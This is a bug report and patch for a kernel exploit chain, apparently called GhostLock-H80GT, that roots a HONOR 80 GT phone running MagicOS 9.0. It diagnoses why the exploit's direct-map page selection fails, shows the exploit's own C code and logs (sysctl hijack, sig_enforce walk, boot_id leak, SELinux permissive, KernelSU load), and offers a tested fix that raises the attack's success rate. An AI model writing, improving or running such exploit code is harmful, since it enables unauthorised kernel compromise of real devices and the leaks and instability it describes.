# Upstream issue: `prepare_dm_page()` can pin a page past `DIRECT_MAP_END`, wedging the sysctl stage

**Project:** GhostLock-H80GT (the H80GT specialized chain bundled by this fork).
**Build observed:** v0.3.1 release bundle (`ghostlock.tar.gz`
`a5a3cff2c3172bd5debe2a4e4f71c69402c00c8cffd37906b1354437b4c8810e`), target
`annap-AGT-AN00_9.0.0.230`, device HONOR 80 GT `AGT-AN00`, MagicOS `9.0.0.230`,
kernel `5.10.236-android12-9-gd671cf8c2b02`, 16 GB.

## Symptom

On some boots the exploit reaches the sysctl walks and then cannot progress:

```
dm: anon=0x7b4339c000 phys=0xb57784000 base(dm)=0xffffff8ad7784000 ...
sysctl walk owner attempt=1 SKIP out-of-ram base=ffffff8ad7784000
sysctl walk owner attempt=2 SKIP out-of-ram base=ffffff8ad7784000
sysctl walk owner attempt=3 SKIP out-of-ram base=ffffff8ad7784000
sysctl walk owner attempt=4 SKIP out-of-ram base=ffffff8ad7784000
sysctl owner read failed (try 1/8)
...
sysctl ctl.data restore failed (boot_id stays hijacked; leak 16B/read to any uid — reboot to clear)
sysctl stage failed
```

The same boot class also fails earlier, at the `sig_enforce` walk, with the identical
`SKIP out-of-ram` signature. Because the hijack is already in place, the failure leaves `boot_id`
redirected and requires a reboot. Three consecutive boots on this device failed this way, at
different walks (`sig_enforce`, `owner`, `restore-fail`), always with `base(dm) >= 0xffffff8a30000000`.

## Cause

`exploit/src/util.c: prepare_dm_page()` accepts a page for the walk on two conditions only — the
plant/phys oracle is stable and (when `W_VALUE_DM` is set) bit 16 of the alias is set:

```c
if (base && (!getenv("W_VALUE_DM") || (base & 0x10000)))
  break;  // good page
```

`exploit/src/sysctl.c: sysctl_do_walk()` independently refuses every attempt whose alias is past the
target's recorded RAM top:

```c
if (page_base >= DIRECT_MAP_END) {
  pr_info("sysctl walk %s attempt=%d SKIP out-of-ram base=%016zx\n", ...);
  continue;
}
```

`DIRECT_MAP_END` for this target is `0xffffff8a30000000` (phys top `0xAB0000000` per `target.h`).
When the allocator hands out a page above that top (`phys` observed `0xac535f000`, `0xb57784000`,
`0xabecac000`), `prepare_dm_page()` still returns it, `g_dm_page` keeps it for the life of the
process, and all 40 walk attempts (`SYSCTL_ROUTE_MAX_ATTEMPTS`) iterate over the same unusable alias.
The stage cannot succeed, and the post-permissive restore is skipped, so `ctl.data` stays hijacked.

## Suggested fix (validated locally)

Retire an out-of-range page exactly like the bit-16 case, so the next round allocates a different
physical page:

```c
if (base && base >= DIRECT_MAP_END) {
  pr_info("dm: base 0x%016zx past DIRECT_MAP_END (phys out of range); retiring page\n", base);
} else if (base && (!getenv("W_VALUE_DM") || (base & 0x10000))) {
  break;  // good page
}
pr_info("dm: base bit16=0 ...; retiring page ...\n");
if (nretired < 16) retired[nretired++] = g_dm_page;
g_dm_page = NULL;
base = 0;
```

Built with NDK r29 (`-static -O2`), 2,221,760 bytes, sha256
`1a67ba9cd46ba3113d3a3515f8384cab7013927b510b82a6ace947d94298077d`, and run on the same device:

- fresh boot, in-range page: module loaded, `Enforcing` restored, `boot_id` unchanged;
- fresh boot, first page out of range: `dm: base 0xffffff8a47668000 past DIRECT_MAP_END … retiring
  page, taking a fresh one (round 0)` followed by `KernelSU module loaded`, `Enforcing`,
  `boot_id` readable.

The second run is the decisive case: it is the exact condition that failed before the patch.

## Notes

- The guard itself is correct; only the page acceptance in `prepare_dm_page()` needs to agree with it.
- A straight `DIRECT_MAP_END` raise would not be right: the observed out-of-range aliases
  (43–48 GB on a 16 GB device) are not usable RAM, they are bogus oracle results.
- Full logs, the three failing runs and both patched runs are available in this repository's
  `docs/analysis/device-gates/H80GT-02.md`.
